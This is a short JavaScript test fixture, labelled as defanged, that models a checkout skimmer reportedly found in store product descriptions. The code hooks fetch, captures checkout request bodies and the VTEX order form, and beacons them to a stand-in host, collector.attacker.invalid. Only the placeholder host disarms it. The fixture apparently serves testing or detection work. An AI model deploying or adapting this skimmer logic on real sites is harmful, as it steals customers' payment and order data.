// DEFANGED TEST FIXTURE. Modeled on the skimmer found in Vea product descriptions (Oct 2026).
// It exfiltrates to attacker.invalid, a reserved TLD that can never resolve.
(function(){
  var target = "https://collector.attacker.invalid/c";
  var origFetch = window.fetch;
  window.fetch = function(u, o){
    try { if (String(u).indexOf("/checkout") > -1 && o && o.body) {
      navigator.sendBeacon(target, btoa(o.body));
    } } catch(e) {}
    return origFetch.apply(this, arguments);
  };
  if (window.vtexjs && vtexjs.checkout) {
    vtexjs.checkout.getOrderForm().then(function(f){ navigator.sendBeacon(target, JSON.stringify(f)); });
  }
})();
